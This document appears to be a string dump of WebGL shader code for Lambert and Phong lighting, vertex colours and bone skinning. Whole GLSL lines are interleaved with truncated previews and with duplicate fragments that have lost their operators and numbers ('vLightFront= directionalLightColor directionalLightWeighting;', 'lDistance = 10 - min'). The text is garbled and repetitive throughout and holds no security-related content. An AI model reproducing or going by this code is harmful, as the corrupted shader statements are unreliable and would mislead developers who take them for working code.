specularStrength;	vec4 texelSpecular = texture2D( specularMap, vUv );	vec4 texelSpecular = texture2D( specularMap, vUv ) specularMap, vUv "\tspecu ... lar.r;"	specularStrength = texelSpecular.r;	specularStrength = texelSpecularr;#else"\tspecu ... = 1.0;"	specularStrength = 1.0;	specularStrength = 1lights_ ... n("\n")lights_ ... _vertex"unifor ... bient;"uniform vec3 ambient;uniform vec3 diffuse;"unifor ... ssive;"uniform vec3 emissive;"unifor ... Color;"uniform vec3 ambientLightColor;"#if MA ... TS > 0"#if MAX_DIR_LIGHTS > 0"\tunifo ... HTS ];"	uniform vec3 directionalLightColor[ MAX_DIR_LIGHTS ];	uniform vec3 directionalLightColor[ MAX_DIR_LIGHTS ]I	uniform vec3 directionalLightDirection[ MAX_DIR_LIGHTS ];	uniform vec3 directionalLightDirection#if MAX_HEMI_LIGHTS > 0	uniform vec3 hemisphereLightSkyColor[ MAX_HEMI_LIGHTS ];	uniform vec3 hemisphereLightSkyColor[ MAX_HEMI_LIGHTS ]	uniform vec3 hemisphereLightGroundColor[ MAX_HEMI_LIGHTS ];	uniform vec3 hemisphereLightGroundColor	uniform vec3 hemisphereLightDirection[ MAX_HEMI_LIGHTS ];	uniform vec3 hemisphereLightDirection#if MAX_POINT_LIGHTS > 0	uniform vec3 pointLightColor[ MAX_POINT_LIGHTS ];	uniform vec3 pointLightColor[ MAX_POINT_LIGHTS ]PN	uniform vec3 pointLightPosition[ MAX_POINT_LIGHTS ];	uniform vec3 pointLightPosition	uniform float pointLightDistance[ MAX_POINT_LIGHTS ];	uniform float pointLightDistance#if MAX_SPOT_LIGHTS > 0	uniform vec3 spotLightColor[ MAX_SPOT_LIGHTS ];	uniform vec3 spotLightColor[ MAX_SPOT_LIGHTS ]	uniform vec3 spotLightPosition[ MAX_SPOT_LIGHTS ];	uniform vec3 spotLightPosition	uniform vec3 spotLightDirection[ MAX_SPOT_LIGHTS ];	uniform vec3 spotLightDirection	uniform float spotLightDistance[ MAX_SPOT_LIGHTS ];	uniform float spotLightDistance	uniform float spotLightAngleCos[ MAX_SPOT_LIGHTS ];	uniform float spotLightAngleCos	uniform float spotLightExponent[ MAX_SPOT_LIGHTS ];	uniform float spotLightExponent#ifdef WRAP_AROUND"\tunifo ... apRGB;"	uniform vec3 wrapRGB;"vLight ... 0.0 );"vLightFront = vec3( 0.0 );vLightFront = vec3( 0.0 ) 0.0  0"#ifdef ... _SIDED"#ifdef DOUBLE_SIDED"\tvLigh ... 0.0 );"	vLightBack = vec3( 0.0 );	vLightBack = vec3"transf ... mal );"transformedNormal = normalize( transformedNormal );transformedNormal = normalize( transformedNormal ) transformedNormal "for( i ... ++ ) {"for( int i = 0; i < MAX_DIR_LIGHTS; i ++ ) {"\tvec4  ... 0.0 );"	vec4 lDirection = viewMatrix * vec4( directionalLightDirection[ i ], 0.0 );	vec4 lDirection = viewMatrix( directionalLightDirection[ i ], 0.0 ) directionalLightDirection[ i ], 0.0  directionalLightDirection[ i ], 0"\tvec3  ... xyz );"	vec3 dirVector = normalize( lDirection.xyz );	vec3 dirVector = normalize( lDirection.xyz ) lDirection.xyz  lDirection"\tfloat ... tor );"	float dotProduct = dot( transformedNormal, dirVector );	float dotProduct = dot( transformedNormal, dirVector ) transformedNormal, dirVector "\tvec3  ... 0 ) );"	vec3 directionalLightWeighting = vec3( max( dotProduct, 0.0 ) );	vec3 directionalLightWeighting = vec3( max( dotProduct, 0.0 ) ) max( dotProduct, 0.0 )  max( dotProduct, 0.0 ) dotProduct, 0.0  dotProduct, 0"\t\tvec3 ... 0 ) );"		vec3 directionalLightWeightingBack = vec3( max( -dotProduct, 0.0 ) );		vec3 directionalLightWeightingBack = vec3( max( -dotProduct, 0.0 ) ) max( -dotProduct, 0.0 ) ( -dotProduct, 0.0 ) -dotProduct, 0.0  -dotProduct, 0"\t\t#ifd ... AROUND"		#ifdef WRAP_AROUND"\t\t\tvec ... 0 ) );"			vec3 directionalLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) );			vec3 directionalLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) ) max( -0.5 * dotProduct + 0.5, 0.0 ) ( -0.5 * dotProduct + 0.5, 0.0 ) -0.5 * dotProduct + 0.5, 0.0  -0 dotProduct5, 0"\t\t#endif"		#endif"\t#ifde ... AROUND"	#ifdef WRAP_AROUND		vec3 directionalLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) );		vec3 directionalLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) ) max( 0.5 * dotProduct + 0.5, 0.0 ) ( 0.5 * dotProduct + 0.5, 0.0 ) 0.5 * dotProduct + 0.5, 0.0 "\t\tdire ... RGB );"		directionalLightWeighting = mix( directionalLightWeighting, directionalLightWeightingHalf, wrapRGB );		directionalLightWeighting = mix( directionalLightWeighting, directionalLightWeightingHalf, wrapRGB ) directionalLightWeighting, directionalLightWeightingHalf, wrapRGB "\t\t#ifd ... _SIDED"		#ifdef DOUBLE_SIDED"\t\t\tdir ... RGB );"			directionalLightWeightingBack = mix( directionalLightWeightingBack, directionalLightWeightingHalfBack, wrapRGB );			directionalLightWeightingBack = mix( directionalLightWeightingBack, directionalLightWeightingHalfBack, wrapRGB ) directionalLightWeightingBack, directionalLightWeightingHalfBack, wrapRGB "\tvLigh ... hting;"	vLightFront += directionalLightColor[ i ] * directionalLightWeighting;	vLightFront= directionalLightColor directionalLightWeighting;"\t\tvLig ... gBack;"		vLightBack += directionalLightColor[ i ] * directionalLightWeightingBack;		vLightBack directionalLightWeightingBack;"\tfor(  ... ++ ) {"	for( int i = 0; i < MAX_POINT_LIGHTS; i ++ ) {		vec4 lPosition = viewMatrix * vec4( pointLightPosition[ i ], 1.0 );		vec4 lPosition = viewMatrix( pointLightPosition[ i ], 1.0 ) pointLightPosition[ i ], 1.0  pointLightPosition, 1"\t\tvec3 ... n.xyz;"		vec3 lVector = lPosition.xyz - mvPosition.xyz;		vec3 lVector = lPositionxyz - mvPosition"\t\tfloa ... = 1.0;"		float lDistance = 1.0;		float lDistance = 1"\t\tif ( ...  0.0 )"		if ( pointLightDistance[ i ] > 0.0 )		if ( pointLightDistance[ i ] > 0.0 ) pointLightDistance[ i ] > 0.0  pointLightDistance > 0"\t\t\tlDi ... 1.0 );"			lDistance = 1.0 - min( ( length( lVector ) / pointLightDistance[ i ] ), 1.0 );			lDistance = 10 - min( ( length( lVector ) / pointLightDistance[ i ] ), 1.0 ) ( length( lVector ) / pointLightDistance[ i ] ), 1.0 ( length( lVector ) / pointLightDistance[ i ] ) length( lVector ) / pointLightDistance[ i ]  length( lVector ) lVector  / pointLightDistance"\t\tlVec ... tor );"		lVector = normalize( lVector );		lVector = normalize"\t\tfloa ... tor );"		float dotProduct = dot( transformedNormal, lVector );		float dotProduct = dot( transformedNormal, lVector ) transformedNormal, lVector 		vec3 pointLightWeighting = vec3( max( dotProduct, 0.0 ) );		vec3 pointLightWeighting = vec3			vec3 pointLightWeightingBack = vec3( max( -dotProduct, 0.0 ) );			vec3 pointLightWeightingBack = vec3"\t\t\t#if ... AROUND"			#ifdef WRAP_AROUND"\t\t\t\tve ... 0 ) );"				vec3 pointLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) );				vec3 pointLightWeightingHalfBack = vec3"\t\t\t#endif"			#endif			vec3 pointLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) );			vec3 pointLightWeightingHalf = vec3"\t\t\tpoi ... RGB );"			pointLightWeighting = mix( pointLightWeighting, pointLightWeightingHalf, wrapRGB );			pointLightWeighting = mix( pointLightWeighting, pointLightWeightingHalf, wrapRGB ) pointLightWeighting, pointLightWeightingHalf, wrapRGB "\t\t\t#if ... _SIDED"			#ifdef DOUBLE_SIDED"\t\t\t\tpo ... RGB );"				pointLightWeightingBack = mix( pointLightWeightingBack, pointLightWeightingHalfBack, wrapRGB );				pointLightWeightingBack = mix( pointLightWeightingBack, pointLightWeightingHalfBack, wrapRGB ) pointLightWeightingBack, pointLightWeightingHalfBack, wrapRGB "\t\tvLig ... tance;"		vLightFront += pointLightColor[ i ] * pointLightWeighting * lDistance;		vLightFront= pointLightColor pointLightWeighting lDistance;"\t\t\tvLi ... tance;"			vLightBack += pointLightColor[ i ] * pointLightWeightingBack * lDistance;			vLightBack pointLightWeightingBack	for( int i = 0; i < MAX_SPOT_LIGHTS; i ++ ) {		vec4 lPosition = viewMatrix * vec4( spotLightPosition[ i ], 1.0 );( spotLightPosition[ i ], 1.0 ) spotLightPosition[ i ], 1.0  spotLightPosition"\t\tfloa ... z ) );"		float spotEffect = dot( spotLightDirection[ i ], normalize( spotLightPosition[ i ] - worldPosition.xyz ) );		float spotEffect = dot( spotLightDirection[ i ], normalize( spotLightPosition[ i ] - worldPosition.xyz ) ) spotLightDirection[ i ], normalize( spotLightPosition[ i ] - worldPosition.xyz )  spotLightDirection, normalize( spotLightPosition[ i ] - worldPosition.xyz ) spotLightPosition[ i ] - worldPosition.xyz  - worldPosition"\t\tif ( ...  ] ) {"		if ( spotEffect > spotLightAngleCos[ i ] ) {"\t\t\tspo ... 0.0 );"			spotEffect = max( pow( spotEffect, spotLightExponent[ i ] ), 0.0 );			spotEffect = max( pow( spotEffect, spotLightExponent[ i ] ), 0.0 ) pow( spotEffect, spotLightExponent[ i ] ), 0.0  pow( spotEffect, spotLightExponent[ i ] ) spotEffect, spotLightExponent[ i ]  spotEffect, spotLightExponent"\t\t\tflo ... = 1.0;"			float lDistance = 1.0;			float lDistance = 1"\t\t\tif  ...  0.0 )"			if ( spotLightDistance[ i ] > 0.0 )			if ( spotLightDistance[ i ] > 0.0 ) spotLightDistance[ i ] > 0.0  spotLightDistance"\t\t\t\tlD ... 1.0 );"				lDistance = 1.0 - min( ( length( lVector ) / spotLightDistance[ i ] ), 1.0 );				lDistance = 1( ( length( lVector ) / spotLightDistance[ i ] ), 1.0 ) ( length( lVector ) / spotLightDistance[ i ] ), 1.0 ( length( lVector ) / spotLightDistance[ i ] ) length( lVector ) / spotLightDistance[ i ]  / spotLightDistance"\t\t\tlVe ... tor );"			lVector = normalize( lVector );			lVector = normalize"\t\t\tflo ... tor );"			float dotProduct = dot( transformedNormal, lVector );			float dotProduct = dot			vec3 spotLightWeighting = vec3( max( dotProduct, 0.0 ) );			vec3 spotLightWeighting = vec3				vec3 spotLightWeightingBack = vec3( max( -dotProduct, 0.0 ) );				vec3 spotLightWeightingBack = vec3"\t\t\t\t#i ... AROUND"				#ifdef WRAP_AROUND"\t\t\t\t\tv ... 0 ) );"					vec3 spotLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) );					vec3 spotLightWeightingHalfBack = vec3"\t\t\t\t#endif"				#endif				vec3 spotLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) );				vec3 spotLightWeightingHalf = vec3"\t\t\t\tsp ... RGB );"				spotLightWeighting = mix( spotLightWeighting, spotLightWeightingHalf, wrapRGB );				spotLightWeighting = mix( spotLightWeighting, spotLightWeightingHalf, wrapRGB ) spotLightWeighting, spotLightWeightingHalf, wrapRGB "\t\t\t\t#i ... _SIDED"				#ifdef DOUBLE_SIDED"\t\t\t\t\ts ... RGB );"					spotLightWeightingBack = mix( spotLightWeightingBack, spotLightWeightingHalfBack, wrapRGB );					spotLightWeightingBack = mix( spotLightWeightingBack, spotLightWeightingHalfBack, wrapRGB ) spotLightWeightingBack, spotLightWeightingHalfBack, wrapRGB "\t\t\tvLi ... ffect;"			vLightFront += spotLightColor[ i ] * spotLightWeighting * lDistance * spotEffect;			vLightFront= spotLightColor spotLightWeighting lDistance spotEffect;"\t\t\t\tvL ... ffect;"				vLightBack += spotLightColor[ i ] * spotLightWeightingBack * lDistance * spotEffect;				vLightBack spotLightWeightingBack	for( int i = 0; i < MAX_HEMI_LIGHTS; i ++ ) {"\t\tvec4 ... 0.0 );"		vec4 lDirection = viewMatrix * vec4( hemisphereLightDirection[ i ], 0.0 );		vec4 lDirection = viewMatrix( hemisphereLightDirection[ i ], 0.0 ) hemisphereLightDirection[ i ], 0.0  hemisphereLightDirection		vec3 lVector = normalize( lDirection.xyz );		vec3 lVector = normalize"\t\tfloa ... + 0.5;"		float hemiDiffuseWeight = 0.5 * dotProduct + 0.5;		float hemiDiffuseWeight = 05;		float hemiDiffuseWeightBack = -0.5 * dotProduct + 0.5;		float hemiDiffuseWeightBack = -0"\t\tvLig ... ght );"		vLightFront += mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeight );= mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeight ) hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeight  hemisphereLightGroundColor, hemisphereLightSkyColor, hemiDiffuseWeight "\t\t\tvLi ... ack );"			vLightBack += mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeightBack );( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeightBack ) hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeightBack , hemiDiffuseWeightBack "vLight ... ssive;"vLightFront = vLightFront * diffuse + ambient * ambientLightColor + emissive;vLightFront = vLightFront ambient ambientLightColor emissive;"\tvLigh ... ssive;"	vLightBack = vLightBack * diffuse + ambient * ambientLightColor + emissive;	vLightBack = vLightBack"#if MA ... VMAP )"#if MAX_SPOT_LIGHTS > 0 || defined( USE_BUMPMAP ) || defined( USE_ENVMAP )#if MAX_SPOT_LIGHTS > 0  defined( USE_ENVMAP )"\tvaryi ... ition;"	varying vec3 vWorldPosition;"\tvWorl ... n.xyz;"	vWorldPosition = worldPosition.xyz;	vWorldPosition = worldPositionlights_ ... ragment"varyin ... ition;"varying vec3 vViewPosition;"varyin ... ormal;"varying vec3 vNormal;"vec3 n ... mal );"vec3 normal = normalize( vNormal );vec3 normal = normalize( vNormal ) vNormal "vec3 v ... ion );"vec3 viewPosition = normalize( vViewPosition );vec3 viewPosition = normalize( vViewPosition ) vViewPosition "\tnorma ... g ) );"	normal = normal * ( -1.0 + 2.0 * float( gl_FrontFacing ) );	normal = normal"\tnorma ... mal );"	normal = perturbNormal2Arb( -vViewPosition, normal );	normal = perturbNormal2Arb( -vViewPosition, normal ) -vViewPosition, normal "#elif  ... PMAP )"#elif defined( USE_BUMPMAP )#elif defined"\tnorma ... d() );"	normal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );	normal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() ) -vViewPosition, normal, dHdxy_fwd()  -vViewPosition, normal, dHdxy_fwd"\tvec3  ... 0.0 );"	vec3 pointDiffuse  = vec3( 0.0 );	vec3 pointDiffuse  = vec3	vec3 pointSpecular = vec3( 0.0 );	vec3 pointSpecular = vec3"\tfor ( ... ++ ) {"	for ( int i = 0; i < MAX_POINT_LIGHTS; i ++ ) {		vec3 lVector = lPosition.xyz + vViewPosition.xyz; vViewPosition		float dotProduct = dot( normal, lVector );( normal, lVector ) normal, lVector "\t\t\tflo ... 0.0 );"			float pointDiffuseWeightFull = max( dotProduct, 0.0 );			float pointDiffuseWeightFull = max			float pointDiffuseWeightHalf = max( 0.5 * dotProduct + 0.5, 0.0 );			float pointDiffuseWeightHalf = max"\t\t\tvec ... RGB );"			vec3 pointDiffuseWeight = mix( vec3( pointDiffuseWeightFull ), vec3( pointDiffuseWeightHalf ), wrapRGB );			vec3 pointDiffuseWeight = mix( vec3( pointDiffuseWeightFull ), vec3( pointDiffuseWeightHalf ), wrapRGB ) vec3( pointDiffuseWeightFull ), vec3( pointDiffuseWeightHalf ), wrapRGB ( pointDiffuseWeightFull ) pointDiffuseWeightFull , vec3( pointDiffuseWeightHalf ) pointDiffuseWeightHalf , wrapRGB "\t\t#else"		#else			float pointDiffuseWeight = max( dotProduct, 0.0 );			float pointDiffuseWeight = max"\t\tpoin ... tance;"		pointDiffuse  += diffuse * pointLightColor[ i ] * pointDiffuseWeight * lDistance;		pointDiffuse = diffuse pointLightColor pointDiffuseWeight		vec3 pointHalfVector = normalize( lVector + viewPosition );		vec3 pointHalfVector = normalize( lVector + viewPosition ) lVector + viewPosition  lVector viewPosition "\t\tfloa ... 0.0 );"		float pointDotNormalHalf = max( dot( normal, pointHalfVector ), 0.0 );		float pointDotNormalHalf = max( dot( normal, pointHalfVector ), 0.0 ) dot( normal, pointHalfVector ), 0.0  dot( normal, pointHalfVector ) normal, pointHalfVector 		float pointSpecularWeight = specularStrength * max( pow( pointDotNormalHalf, shininess ), 0.0 );		float pointSpecularWeight = specularStrength( pow( pointDotNormalHalf, shininess ), 0.0 ) pow( pointDotNormalHalf, shininess ), 0.0 ( pointDotNormalHalf, shininess ) pointDotNormalHalf, shininess "\t\tfloa ... / 8.0;"		float specularNormalization = ( shininess + 2.0001 ) / 8.0;		float specularNormalization = ( shininess + 2.0001 ) shininess + 2.0001  shininess0001  / 8"\t\tvec3 ... 5.0 );"		vec3 schlick = specular + vec3( 1.0 - specular ) * pow( max( 1.0 - dot( lVector, pointHalfVector ), 0.0 ), 5.0 );		vec3 schlick = specular( 1.0 - specular ) 1.0 - specular  10 - specular ( max( 1.0 - dot( lVector, pointHalfVector ), 0.0 ), 5.0 ) max( 1.0 - dot( lVector, pointHalfVector ), 0.0 ), 5.0 ( 1.0 - dot( lVector, pointHalfVector ), 0.0 ) 1.0 - dot( lVector, pointHalfVector ), 0.0 0 - dot( lVector, pointHalfVector ) lVector, pointHalfVector , 5"\t\tpoin ... ation;"		pointSpecular += schlick * pointLightColor[ i ] * pointSpecularWeight * pointDiffuseWeight * lDistance * specularNormalization;		pointSpecular= schlick pointSpecularWeight specularNormalization;	vec3 spotDiffuse  = vec3( 0.0 );	vec3 spotDiffuse  = vec3	vec3 spotSpecular = vec3( 0.0 );	vec3 spotSpecular = vec3	for ( int i = 0; i < MAX_SPOT_LIGHTS; i ++ ) {		if ( spotLightDistance[ i ] > 0.0 )			lDistance = 1.0 - min( ( length( lVector ) / spotLightDistance[ i ] ), 1.0 );"\t\tfloa ... n ) );"		float spotEffect = dot( spotLightDirection[ i ], normalize( spotLightPosition[ i ] - vWorldPosition ) );( spotLightDirection[ i ], normalize( spotLightPosition[ i ] - vWorldPosition ) ) spotLightDirection[ i ], normalize( spotLightPosition[ i ] - vWorldPosition ) ( spotLightPosition[ i ] - vWorldPosition ) spotLightPosition[ i ] - vWorldPosition  - vWorldPosition 			float dotProduct = dot( normal, lVector );"\t\t\t\tfl ... 0.0 );"				float spotDiffuseWeightFull = max( dotProduct, 0.0 );				float spotDiffuseWeightFull = max				float spotDiffuseWeightHalf = max( 0.5 * dotProduct + 0.5, 0.0 );				float spotDiffuseWeightHalf = max"\t\t\t\tve ... RGB );"				vec3 spotDiffuseWeight = mix( vec3( spotDiffuseWeightFull ), vec3( spotDiffuseWeightHalf ), wrapRGB );				vec3 spotDiffuseWeight = mix( vec3( spotDiffuseWeightFull ), vec3( spotDiffuseWeightHalf ), wrapRGB ) vec3( spotDiffuseWeightFull ), vec3( spotDiffuseWeightHalf ), wrapRGB ( spotDiffuseWeightFull ) spotDiffuseWeightFull ( spotDiffuseWeightHalf ) spotDiffuseWeightHalf "\t\t\t#else"			#else				float spotDiffuseWeight = max( dotProduct, 0.0 );				float spotDiffuseWeight = max"\t\t\tspo ... ffect;"			spotDiffuse += diffuse * spotLightColor[ i ] * spotDiffuseWeight * lDistance * spotEffect;			spotDiffuse spotLightColor spotDiffuseWeight"\t\t\tvec ... ion );"			vec3 spotHalfVector = normalize( lVector + viewPosition );			vec3 spotHalfVector = normalize			float spotDotNormalHalf = max( dot( normal, spotHalfVector ), 0.0 );			float spotDotNormalHalf = max( dot( normal, spotHalfVector ), 0.0 ) dot( normal, spotHalfVector ), 0.0 ( normal, spotHalfVector ) normal, spotHalfVector 			float spotSpecularWeight = specularStrength * max( pow( spotDotNormalHalf, shininess ), 0.0 );			float spotSpecularWeight = specularStrength( pow( spotDotNormalHalf, shininess ), 0.0 ) pow( spotDotNormalHalf, shininess ), 0.0 ( spotDotNormalHalf, shininess ) spotDotNormalHalf, shininess "\t\t\tflo ... / 8.0;"			float specularNormalization = ( shininess + 2.0001 ) / 8.0;			float specularNormalization = "\t\t\tvec ... 5.0 );"			vec3 schlick = specular + vec3( 1.0 - specular ) * pow( max( 1.0 - dot( lVector, spotHalfVector ), 0.0 ), 5.0 );			vec3 schlick = specular( max( 1.0 - dot( lVector, spotHalfVector ), 0.0 ), 5.0 ) max( 1.0 - dot( lVector, spotHalfVector ), 0.0 ), 5.0 ( 1.0 - dot( lVector, spotHalfVector ), 0.0 ) 1.0 - dot( lVector, spotHalfVector ), 0.0 ( lVector, spotHalfVector ) lVector, spotHalfVector 			spotSpecular += schlick * spotLightColor[ i ] * spotSpecularWeight * spotDiffuseWeight * lDistance * specularNormalization * spotEffect;			spotSpecular spotSpecularWeight specularNormalization	vec3 dirDiffuse  = vec3( 0.0 );	vec3 dirDiffuse  = vec3	vec3 dirSpecular = vec3( 0.0 );	vec3 dirSpecular = vec3	for( int i = 0; i < MAX_DIR_LIGHTS; i ++ ) {		vec4 lDirection = viewMatrix * vec4( directionalLightDirection[ i ], 0.0 );		vec3 dirVector = normalize( lDirection.xyz );		vec3 dirVector = normalize		float dotProduct = dot( normal, dirVector );( normal, dirVector ) normal, dirVector 			float dirDiffuseWeightFull = max( dotProduct, 0.0 );			float dirDiffuseWeightFull = max			float dirDiffuseWeightHalf = max( 0.5 * dotProduct + 0.5, 0.0 );			float dirDiffuseWeightHalf = max			vec3 dirDiffuseWeight = mix( vec3( dirDiffuseWeightFull ), vec3( dirDiffuseWeightHalf ), wrapRGB );			vec3 dirDiffuseWeight = mix( vec3( dirDiffuseWeightFull ), vec3( dirDiffuseWeightHalf ), wrapRGB ) vec3( dirDiffuseWeightFull ), vec3( dirDiffuseWeightHalf ), wrapRGB ( dirDiffuseWeightFull ) dirDiffuseWeightFull ( dirDiffuseWeightHalf ) dirDiffuseWeightHalf 			float dirDiffuseWeight = max( dotProduct, 0.0 );			float dirDiffuseWeight = max"\t\tdirD ... eight;"		dirDiffuse  += diffuse * directionalLightColor[ i ] * dirDiffuseWeight;		dirDiffuse  directionalLightColor dirDiffuseWeight;		vec3 dirHalfVector = normalize( dirVector + viewPosition );		vec3 dirHalfVector = normalize( dirVector + viewPosition ) dirVector + viewPosition  dirVector		float dirDotNormalHalf = max( dot( normal, dirHalfVector ), 0.0 );		float dirDotNormalHalf = max( dot( normal, dirHalfVector ), 0.0 ) dot( normal, dirHalfVector ), 0.0 ( normal, dirHalfVector ) normal, dirHalfVector 		float dirSpecularWeight = specularStrength * max( pow( dirDotNormalHalf, shininess ), 0.0 );		float dirSpecularWeight = specularStrength( pow( dirDotNormalHalf, shininess ), 0.0 ) pow( dirDotNormalHalf, shininess ), 0.0 ( dirDotNormalHalf, shininess ) dirDotNormalHalf, shininess 		vec3 schlick = specular + vec3( 1.0 - specular ) * pow( max( 1.0 - dot( dirVector, dirHalfVector ), 0.0 ), 5.0 );( max( 1.0 - dot( dirVector, dirHalfVector ), 0.0 ), 5.0 ) max( 1.0 - dot( dirVector, dirHalfVector ), 0.0 ), 5.0 ( 1.0 - dot( dirVector, dirHalfVector ), 0.0 ) 1.0 - dot( dirVector, dirHalfVector ), 0.0 ( dirVector, dirHalfVector ) dirVector, dirHalfVector "\t\tdirS ... ation;"		dirSpecular += schlick * directionalLightColor[ i ] * dirSpecularWeight * dirDiffuseWeight * specularNormalization;		dirSpecular dirSpecularWeight dirDiffuseWeight	vec3 hemiDiffuse  = vec3( 0.0 );	vec3 hemiDiffuse  = vec3	vec3 hemiSpecular = vec3( 0.0 );	vec3 hemiSpecular = vec3"\t\tvec3 ... ght );"		vec3 hemiColor = mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeight );		vec3 hemiColor = mix"\t\themi ... Color;"		hemiDiffuse += diffuse * hemiColor;		hemiDiffuse hemiColor;		vec3 hemiHalfVectorSky = normalize( lVector + viewPosition );		vec3 hemiHalfVectorSky = normalize		float hemiDotNormalHalfSky = 0.5 * dot( normal, hemiHalfVectorSky ) + 0.5;		float hemiDotNormalHalfSky = 0( normal, hemiHalfVectorSky ) normal, hemiHalfVectorSky 		float hemiSpecularWeightSky = specularStrength * max( pow( hemiDotNormalHalfSky, shininess ), 0.0 );		float hemiSpecularWeightSky = specularStrength( pow( hemiDotNormalHalfSky, shininess ), 0.0 ) pow( hemiDotNormalHalfSky, shininess ), 0.0 ( hemiDotNormalHalfSky, shininess ) hemiDotNormalHalfSky, shininess "\t\tvec3 ... ector;"		vec3 lVectorGround = -lVector;		vec3 hemiHalfVectorGround = normalize( lVectorGround + viewPosition );		vec3 hemiHalfVectorGround = normalize( lVectorGround + viewPosition ) lVectorGround + viewPosition  lVectorGround		float hemiDotNormalHalfGround = 0.5 * dot( normal, hemiHalfVectorGround ) + 0.5;		float hemiDotNormalHalfGround = 0( normal, hemiHalfVectorGround ) normal, hemiHalfVectorGround 		float hemiSpecularWeightGround = specularStrength * max( pow( hemiDotNormalHalfGround, shininess ), 0.0 );		float hemiSpecularWeightGround = specularStrength( pow( hemiDotNormalHalfGround, shininess ), 0.0 ) pow( hemiDotNormalHalfGround, shininess ), 0.0 ( hemiDotNormalHalfGround, shininess ) hemiDotNormalHalfGround, shininess "\t\tfloa ... und );"		float dotProductGround = dot( normal, lVectorGround );		float dotProductGround = dot( normal, lVectorGround ) normal, lVectorGround 		vec3 schlickSky = specular + vec3( 1.0 - specular ) * pow( max( 1.0 - dot( lVector, hemiHalfVectorSky ), 0.0 ), 5.0 );		vec3 schlickSky = specular( max( 1.0 - dot( lVector, hemiHalfVectorSky ), 0.0 ), 5.0 ) max( 1.0 - dot( lVector, hemiHalfVectorSky ), 0.0 ), 5.0 ( 1.0 - dot( lVector, hemiHalfVectorSky ), 0.0 ) 1.0 - dot( lVector, hemiHalfVectorSky ), 0.0 ( lVector, hemiHalfVectorSky ) lVector, hemiHalfVectorSky 		vec3 schlickGround = specular + vec3( 1.0 - specular ) * pow( max( 1.0 - dot( lVectorGround, hemiHalfVectorGround ), 0.0 ), 5.0 );		vec3 schlickGround = specular( max( 1.0 - dot( lVectorGround, hemiHalfVectorGround ), 0.0 ), 5.0 ) max( 1.0 - dot( lVectorGround, hemiHalfVectorGround ), 0.0 ), 5.0 ( 1.0 - dot( lVectorGround, hemiHalfVectorGround ), 0.0 ) 1.0 - dot( lVectorGround, hemiHalfVectorGround ), 0.0 ( lVectorGround, hemiHalfVectorGround ) lVectorGround, hemiHalfVectorGround "\t\themi ... 0 ) );"		hemiSpecular += hemiColor * specularNormalization * ( schlickSky * hemiSpecularWeightSky * max( dotProduct, 0.0 ) + schlickGround * hemiSpecularWeightGround * max( dotProductGround, 0.0 ) );		hemiSpecular= hemiColor( schlickSky * hemiSpecularWeightSky * max( dotProduct, 0.0 ) + schlickGround * hemiSpecularWeightGround * max( dotProductGround, 0.0 ) ) schlickSky * hemiSpecularWeightSky * max( dotProduct, 0.0 ) + schlickGround * hemiSpecularWeightGround * max( dotProductGround, 0.0 )  schlickSky hemiSpecularWeightSky schlickGround hemiSpecularWeightGround( dotProductGround, 0.0 ) dotProductGround, 0.0  dotProductGround, 0"vec3 t ... 0.0 );"vec3 totalDiffuse = vec3( 0.0 );vec3 totalDiffuse = vec3vec3 totalSpecular = vec3( 0.0 );vec3 totalSpecular = vec3"\ttotal ... ffuse;"	totalDiffuse += dirDiffuse;	totalDiffuse= dirDiffuse;"\ttotal ... cular;"	totalSpecular += dirSpecular;	totalSpecular= dirSpecular;	totalDiffuse += hemiDiffuse;= hemiDiffuse;	totalSpecular += hemiSpecular;= hemiSpecular;	totalDiffuse += pointDiffuse;= pointDiffuse;	totalSpecular += pointSpecular;= pointSpecular;	totalDiffuse += spotDiffuse;= spotDiffuse;	totalSpecular += spotSpecular;= spotSpecular;#ifdef METAL"\tgl_Fr ... lar );"	gl_FragColor.xyz = gl_FragColor.xyz * ( emissive + totalDiffuse + ambientLightColor * ambient + totalSpecular );	gl_FragColorxyz = gl_FragColor( emissive + totalDiffuse + ambientLightColor * ambient + totalSpecular ) emissive + totalDiffuse + ambientLightColor * ambient + totalSpecular  totalDiffuse totalSpecular "\tgl_Fr ... cular;"	gl_FragColor.xyz = gl_FragColor.xyz * ( emissive + totalDiffuse + ambientLightColor * ambient ) + totalSpecular;( emissive + totalDiffuse + ambientLightColor * ambient ) emissive + totalDiffuse + ambientLightColor * ambient  ambient  totalSpecular;color_p ... n("\n")#ifdef USE_COLOR"\tvaryi ... Color;"	varying vec3 vColor;color_f ... n("\n")"\tgl_Fr ... 1.0 );"	gl_FragColor = gl_FragColor * vec4( vColor, 1.0 );( vColor, 1.0 ) vColor, 1.0  vColor, 1color_v ... n("\n")"\t\tvCol ... color;"		vColor = color * color;		vColor = color color;"\t\tvColor = color;"		vColor = color;skinnin ... n("\n")"#ifdef ... INNING"#ifdef USE_SKINNING"\t#ifde ... EXTURE"	#ifdef BONE_TEXTURE"\t\tunif ... xture;"		uniform sampler2D boneTexture;"\t\tunif ... Width;"		uniform int boneTextureWidth;"\t\tunif ... eight;"		uniform int boneTextureHeight;"\t\tmat4 ...  i ) {"		mat4 getBoneMatrix( const in float i ) {"\t\t\tflo ... * 4.0;"			float j = i * 4.0;			float j = i 4"\t\t\tflo ... h ) );"			float x = mod( j, float( boneTextureWidth ) );			float x = mod( j, float( boneTextureWidth ) ) j, float( boneTextureWidth )  j, float( boneTextureWidth ) 